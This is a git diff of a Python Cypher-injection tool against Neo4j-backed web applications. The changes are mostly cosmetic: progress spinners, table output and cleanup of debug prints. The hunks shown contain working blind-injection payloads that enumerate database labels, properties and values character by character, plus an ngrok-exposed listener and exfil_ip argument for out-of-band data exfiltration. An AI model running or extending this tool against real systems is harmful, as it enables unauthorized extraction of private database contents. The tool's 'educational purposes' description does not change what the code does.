@@ -51,7 +51,7 @@ def get_data(timeout=5):
 
 
     except queue.Empty:
-        print(colored("[!] Injection failed, did not receive request from listener. WAF maybe ?"), "red")
+        print(colored("[!] Injection failed, did not receive request from listener. WAF maybe ?", "red"))
         return None
 
 
@@ -67,7 +67,7 @@ def get_parsed_data(timeout=5):
         return parsed_data
 
     except queue.Empty:
-        print(colored("[!] Injection failed, did not receive request from listener. WAF maybe ?"), "red")
+        print(colored("[!] Injection failed, did not receive request from listener. WAF maybe ?","red"))
         return None
 
 
@@ -266,9 +266,11 @@ class Neo4jInjector:
         return False
 
     def detect_inject(self):
+        animation = "|/-\\"
+        anim_index = 0
         random.seed(time.strftime("%H:%M:%S", time.localtime()))
         random_num = random.randint(0, 999)
-        print("Determining if the target is injectable")
+        print("")
         injection_characters = ["'", "\"", "'})", "\"})", ""]
         encoded_payload = quote(self.blind_string, safe='')
         url, data = self.prepare_request_data(encoded_payload)
@@ -277,6 +279,8 @@ class Neo4jInjector:
             if (input("Seems like something went wrong, continue? (y|N)").lower != "y"):
                 sys.exit()
         for injection_character in injection_characters:
+            print(f"[{animation[anim_index % len(animation)]}] Checking injectability", end='\r', flush=True)
+            anim_index += 1
             injection_case = None
             self.working_char = injection_character
             if (self.working_char == ""):
@@ -291,6 +295,7 @@ class Neo4jInjector:
             if (self.check_true(injection_case)):
                 return True
         self.working_char = "UNDEFINED"
+        print(" " * 500, end='\r')
         return False
             
 
@@ -456,7 +461,6 @@ class Neo4jInjector:
     def find_label_count(self):
         for count_index in range(1000):
             responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{CALL db.labels() YIELD label RETURN label}} = {count_index}"))
-            # responses = self.inject_payload(f" AND COUNT {{CALL db.labels() YIELD label RETURN label}} = {count_index} and '1'='1")
             for response in responses:
                 if (self.check_true(response)):
                     return count_index
@@ -468,7 +472,6 @@ class Neo4jInjector:
             break_flag = False
             for size_index in range(1000):
                 responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}"))
-                # responses = self.inject_payload(f" AND EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}  AND '1' = '1")
                 for response in responses:
                     break_flag = self.check_true(response)
                     if (break_flag):
@@ -476,22 +479,22 @@ class Neo4jInjector:
                         break
                 if (break_flag):
                     break
-                # if any(self.blind_string in response.text for response in responses):
-                #     label_sizes_dict[count_index] = size_index
-                #     break
         return label_sizes_dict
 
     def dump_labels(self, label_sizes):
+        print(f"\n[*] available labels [{len(label_sizes)}]")
         valid_chars = string.ascii_letters + string.digits + string.punctuation
         labels = []
+        animation = "|/-\\"
+        anim_index = 0
         for count_index, size in label_sizes.items():
             label = ''
             for size_index in range(size):
                 break_flag = False
                 for char in valid_chars:
                     responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SUBSTRING(list[{count_index}], {size_index}, 1) = '{char}' RETURN list}}"))
-                    # responses = self.inject_payload(f" AND EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SUBSTRING(list[{count_index}], {size_index}, 1) = '{char}' RETURN list}} AND '1' = '1")
-                    print(f"Found Label: {label}{char}", end='\r')
+                    print(f"[{animation[anim_index % len(animation)]}] building label: {label}{char}", end='\r', flush=True)
+                    anim_index += 1
                     for response in responses:
                         break_flag = self.check_true(response)
                         if (break_flag):
@@ -499,21 +502,22 @@ class Neo4jInjector:
                             break
                     if (break_flag):
                         break
-                    # if any(self.blind_string in response.text for response in responses):
-                    #     label += char
-                    #     break
+            print(" " * 50, end='\r')
+            print(f"[+] {label}")
             labels.append(label)
         return labels
 
 
     def find_property_counts(self, labels):
         property_counts_dict = {}
+        animation = "|/-\\"
+        anim_index = 0
         for label in labels:
             break_flag = False
             for count_index in range(1000):
                 responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{MATCH (x:{label}) UNWIND keys(x) as properties RETURN DISTINCT properties}} = {count_index}"))
-                # responses = self.inject_payload(f" AND COUNT {{MATCH (x:{label}) UNWIND keys(x) as properties RETURN DISTINCT properties}} = {count_index} AND '1' = '1")
-                # Check for the blind string in each response
+                print(f"[{animation[anim_index % len(animation)]}] dumping property counts, might take awhile", end='\r', flush=True)
+                anim_index += 1
                 for response in responses:
                     break_flag = self.check_true(response)
                     if (break_flag):
@@ -521,24 +525,21 @@ class Neo4jInjector:
                         break
                 if (break_flag):
                     break
-                # if any(self.blind_string in response.text for response in responses):
-                #     property_counts_dict[label] = count_index
-                #     break
+        print(" " * 70, end='\r')
         return property_counts_dict
 
     def find_property_sizes(self, property_counts_dict):
         property_sizes_dict = {}
-
+        animation = "|/-\\"
+        anim_index = 0
         for label, count in property_counts_dict.items():
             for count_index in range(count):
                 break_flag = False 
                 for size_index in range(1000):
                     # Construct and send your query
                     responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH COLLECT(DISTINCT(properties)) AS list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}"))
-                    # responses = self.inject_payload(f" AND EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH COLLECT(DISTINCT(properties)) AS list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}} AND '1' = '1")
-                    # Debugging print statement to show the current n value
-                    print(f"{label} - {count_index} prop size {size_index}")
-                    # Check if the blind string is in any of the responses
+                    print(f"[{animation[anim_index % len(animation)]}] dumping property sizes, might take awhile", end='\r', flush=True)
+                    anim_index += 1
                     for response in responses:
                         break_flag = self.check_true(response)
                         if (break_flag):
@@ -546,61 +547,55 @@ class Neo4jInjector:
                                     property_sizes_dict[label] = {}
                                 # Now that we're sure label exists in value_counts, record the count
                                 property_sizes_dict[label][count_index] = size_index
-                                print(f"Found '{self.blind_string}' in response for label {label}, count {count_index}, size {size_index}")
                                 break  # Stop searching after finding the blind string for this property
                     if (break_flag):
                         break
-                    # if any(self.blind_string in response.text for response in responses):
-                    #     if label not in property_sizes_dict:
-                    #         property_sizes_dict[label] = {}
-                    #     # Now that we're sure label exists in value_counts, record the count
-                    #     property_sizes_dict[label][count_index] = size_index
-                    #     print(f"Found '{self.blind_string}' in response for label {label}, count {count_index}, size {size_index}")
-                    #     break  # Stop searching after finding the blind string for this property
+        print(" " * 70, end='\r')
         return property_sizes_dict
 
 
     def dump_properties(self, property_sizes_dict):
         valid_chars = string.ascii_letters + string.digits + string.punctuation
         properties_dict = {}
+        animation = "|/-\\"
+        anim_index = 0
         for label, size_dict in property_sizes_dict.items():
+            print(f"\n[*] Label: {label}")
+            print(f"[+] available properties [{len(size_dict)}]")
             for count_index, size in size_dict.items():
                 pr0perty = ''
                 for size_index in range(size):
                     break_flag = False
                     for char in valid_chars:
                         responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH DISTINCT properties WITH COLLECT(properties) as list WHERE SUBSTRING(list[{count_index}],{size_index},1) = '{char}' RETURN list}}"))
-                        # responses = self.inject_payload(f" AND EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH DISTINCT properties WITH COLLECT(properties) as list WHERE SUBSTRING(list[{count_index}],{size_index},1) = '{char}' RETURN list}} AND '1' = '1")
-                        # Check if any of the responses contain the blind string
+                        print(f"[{animation[anim_index % len(animation)]}] building property: {pr0perty}{char}", end='\r', flush=True)
+                        anim_index += 1
                         for response in responses:
                             break_flag = self.check_true(response)
                             if (break_flag):
-                                    print(f"Found '{self.blind_string}' in response for property {count_index}, size {size_index}, character {char}")
                                     pr0perty += char
-                                    break  # Exit the inner loop once the blind string is found
+                                    break 
                         if (break_flag):
                             break
-                        # if any(self.blind_string in response.text for response in responses):
-                        #     print(f"Found '{self.blind_string}' in response for property {count_index}, size {size_index}, character {char}")
-                        #     pr0perty += char
-                        #     break  # Exit the inner loop once the blind string is found
-
+                print(" " * 50, end='\r') 
+                print(f"[++] {pr0perty}")
                 if label in properties_dict:
                     properties_dict[label].append(pr0perty)
                 else:
                     properties_dict[label] = [pr0perty]
-
         return properties_dict
 
     def find_value_count(self, properties_dict):
         value_counts_dict = {}
+        animation = "|/-\\"
+        anim_index = 0
         for label, properties in properties_dict.items():
             for pr0perty in properties:
                 break_flag = False
                 for count_index in range(1000):
                     responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{MATCH (x:{label}) RETURN x.{pr0perty}}} = {count_index}"))
-                    # responses = self.inject_payload(f" AND COUNT {{MATCH (x:{label}) RETURN x.{pr0perty}}} = {count_index} AND '1' = '1")
-                    # Check for the blind string in each response
+                    print(f"[{animation[anim_index % len(animation)]}] dumping value counts, might take awhile", end='\r', flush=True)
+                    anim_index += 1
                     for response in responses:
                         break_flag = self.check_true(response)
                         if (break_flag):
@@ -609,23 +604,17 @@ class Neo4jInjector:
                                 value_counts_dict[label] = {}
                             # Now that we're sure label exists in value_counts, record the count
                             value_counts_dict[label][pr0perty] = count_index
-                            print(f"Found '{self.blind_string}' in response for label {label}, property {pr0perty}, count {count_index}")
                             break  # Stop searching after finding the blind string for this property
                     if (break_flag):
                         break
-                    # if any(self.blind_string in response.text for response in responses):
-                    #     # Ensure the label is in value_counts, creating a dict for it if not
-                    #     if label not in value_counts_dict:
-                    #         value_counts_dict[label] = {}
-                    #     # Now that we're sure label exists in value_counts, record the count
-                    #     value_counts_dict[label][pr0perty] = count_index
-                    #     print(f"Found '{self.blind_string}' in response for label {label}, property {pr0perty}, count {count_index}")
-                    #     break  # Stop searching after finding the blind string for this property
+        print(" " * 70, end='\r')       
         return value_counts_dict
 
 
     def find_value_size(self, value_counts_dict):
         value_sizes_dict = {}
+        animation = "|/-\\"
+        anim_index = 0
         for label, properties_dict in value_counts_dict.items():
             value_sizes_dict[label] = {}
             for pr0perty, count in properties_dict.items():
@@ -634,82 +623,86 @@ class Neo4jInjector:
                     break_flag = False
                     for size_index in range(1000):  # Assuming 'n' is the size you're looking to determine
                         responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) WITH COLLECT(x.{pr0perty}) as list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}"))
-                        # responses = self.inject_payload(f" AND EXISTS {{MATCH (x:{label}) WITH COLLECT(x.{pr0perty}) as list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}} AND '1' = '1")
-                        # Check for the blind string in each response
+                        print(f"[{animation[anim_index % len(animation)]}] dumping value counts, might take awhile", end='\r', flush=True)
+                        anim_index += 1
                         for response in responses:
                             break_flag = self.check_true(response)
                             if (break_flag):
                                 if count_index not in value_sizes_dict[label][pr0perty]:
                                     value_sizes_dict[label][pr0perty][count_index] = size_index
-                                print(f"Found '{self.blind_string}' in response for label {label}, pr0perty {pr0perty}, occurrence {count_index} with size {size_index}")
                                 break  # Found the size for this occurrence, no need to continue
                         if (break_flag):
                             break
-                        # if any(self.blind_string in response.text for response in responses):
-                        #     if count_index not in value_sizes_dict[label][pr0perty]:
-                        #         value_sizes_dict[label][pr0perty][count_index] = size_index
-                        #     print(f"Found '{self.blind_string}' in response for label {label}, pr0perty {pr0perty}, occurrence {count_index} with size {size_index}")
-                        #     break  # Found the size for this occurrence, no need to continue
+        print(" " * 70, end='\r')
         return value_sizes_dict
 
     def dump_value(self, value_sizes_dict):
         valid_chars = string.ascii_letters + string.digits + string.punctuation
-        values = []
+        values_dict = {}
+        animation = "|/-\\"
+        anim_index = 0
         for label, properties_dict in value_sizes_dict.items():
+            print(f"\n[*] Label: {label}")
+            print(f"[+] available properties [{len(properties_dict)}]")
+
+            if label not in values_dict:
+                values_dict[label] = {}
+
             for pr0perty, size_dict in properties_dict.items():
+                print(f"[++] {pr0perty}")
+
+                if pr0perty not in values_dict[label]:
+                    values_dict[label][pr0perty] = {}
+
                 for count_index, size in size_dict.items():
                     value = ''
                     for size_index in range(size):
                         break_flag = False
                         for char in valid_chars:
                             responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{ MATCH (x:{label}) WITH COLLECT(x.{pr0perty}) as list WHERE SUBSTRING(list[{count_index}], {size_index}, 1) = '{char}' RETURN list}}"))
-                            # responses = self.inject_payload(f" AND EXISTS {{ MATCH (x:{label}) WITH COLLECT(x.{pr0perty}) as list WHERE SUBSTRING(list[{count_index}], {size_index}, 1) = '{char}' RETURN list}} AND '1' = '1")
+                            print(f"[{animation[anim_index % len(animation)]}] building value: {value}{char}", end='\r', flush=True)
+                            anim_index += 1
                             for response in responses:
                                 break_flag = self.check_true(response)
                                 if (break_flag):
                                     value += char
-                                    print(f"Found '{self.blind_string}' in response for label {label}, property {pr0perty}, occurrence {count_index} with size {size_index}, with char {char}")
                                     break  # Found the size for this occurrence, no need to continue
                             if (break_flag):
                                 break
-                            # if any(self.blind_string in response.text for response in responses):
-                            #     value += char
-                            #     print(f"Found '{self.blind_string}' in response for label {label}, property {pr0perty}, occurrence {count_index} with size {size_index}, with char {char}")
-                            #     break  # Found the size for this occurrence, no need to continue
-                    values.append(value)
-        return values
+                    print(" " * 50, end='\r') 
+                    print(f"[+++] {value}")
+
+                    values_dict[label][pr0perty][count_index] = value
+                    
+        for label, properties in values_dict.items():
+            print(f"\n[*] Label: {label}")
+            property_names = list(properties.keys())
+            print(f"[+] available properties [{len(property_names)}]:")
+            for prop in property_names:
+                print(f"[++] {prop}")
+            print(f"[{len(next(iter(properties.values())).items())} entries]")
+            
+            entries_count = max(len(v) for v in properties.values())
+
+            rows = []
+            for i in range(entries_count):
+                row = [properties[prop].get(i, '') for prop in property_names]
+                rows.append(row)
+
+            print(tabulate(rows, headers=[prop.capitalize() for prop in property_names], tablefmt="grid"))
+        return values_dict
 
     def blind(self):
         label_count = self.find_label_count()
         label_sizes_dict = self.find_label_sizes(label_count)
-        print(label_sizes_dict)
         labels = self.dump_labels(label_sizes_dict)
-        print(labels)
         property_counts_dict = self.find_property_counts(labels)
-        print(property_counts_dict)
         property_sizes_dict = self.find_property_sizes(property_counts_dict)
-        print(property_sizes_dict)
         properties_dict = self.dump_properties(property_sizes_dict)
         value_counts_dict = self.find_value_count(properties_dict)
         value_sizes_dict = self.find_value_size(value_counts_dict)
         values = self.dump_value(value_sizes_dict)
 
-
-        print(f"\n[*] available labels [{label_count}]:")
-        for label in labels:
-            print(f"[+] {label}")
-
-
-        print(properties_dict)
-        for label, properties in properties_dict.items():
-            print(f"\n[*] Label: {label}")
-            print(f"[+] available properties [{len(properties)}]")
-            for pr0perty in properties:
-                print(f"[++] {pr0perty}")
-
-        print(value_counts_dict)
-        print(value_sizes_dict)
-        print(values)
 
 def main():
     parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
@@ -731,7 +724,7 @@ def main():
         if ngrok_auth_token:
             ngrok.set_auth_token(ngrok_auth_token)
         else:
-            print("Ngrok auth token not set. Please set the NGROK_AUTH_TOKEN environment variable.")
+            print("Ngrok auth token not set. Please set the NGROK_AUTHTOKEN environment variable.")
             sys.exit(1)
         start_ngrok = ngrok.connect(args.listen_port, "tcp")
         url = start_ngrok.public_url.replace("tcp://", "http://")
@@ -749,10 +742,11 @@ def main():
     injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie, args.blind_string)
 
     if (injector.detect_inject()):
-        print(colored("Target likely injectable, continuing"),"green")
-        print(f"working character: {injector.working_char}")
+        print(colored("[*] target likely injectable, continuing", "green"))
+        print(f"[+] working character: [{injector.working_char}]")
     else:
-        if (input("Target likely not injectable, continue? (y/n default: n)").lower() != "y"):
+        still_inject = input(colored("Target likely not injectable, continue? (y/n default: n)", "red")).lower()
+        if still_inject != "y":
             return
 
     # Begin exfiltration process
